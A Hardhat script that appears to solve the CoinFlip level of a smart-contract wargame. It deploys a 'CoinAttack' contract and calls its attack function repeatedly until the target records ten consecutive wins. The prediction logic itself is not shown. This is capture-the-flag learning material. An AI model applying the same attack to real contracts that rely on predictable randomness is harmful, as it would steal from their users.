const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let count, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x4eCC6c9164f7Bd16d87134FfeDb86a23d9Bf7f30"
    let target = await ethers.getContractAt("CoinFlip", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory("CoinAttack")
    let attackerContract = await attackerContractFactory.deploy(target.address)
    // Re-use deployed contract
    // let attackerContract = await ethers.getContractAt(
    //     "CoinAttack",
    //     ""
    // )

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker contract deployed at : ${attackerContract.address}`)

    // Attack
    let i = parseInt((await target.consecutiveWins()).toString())
    for (; i < 10; i++) {
        try {
            console.log(`Commencing attack #${i + 1}`)
            tx = await attackerContract.attack()
            await tx.wait(1)
        } catch (err) {
            i--
        }
    }

    // Check
    count = await target.consecutiveWins()
    if (count == 10) {
        console.log(`${symbols.success} Won 10 games!`)
    } else {
        console.log(`${symbols.error} Only won ${count} consecutive games`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
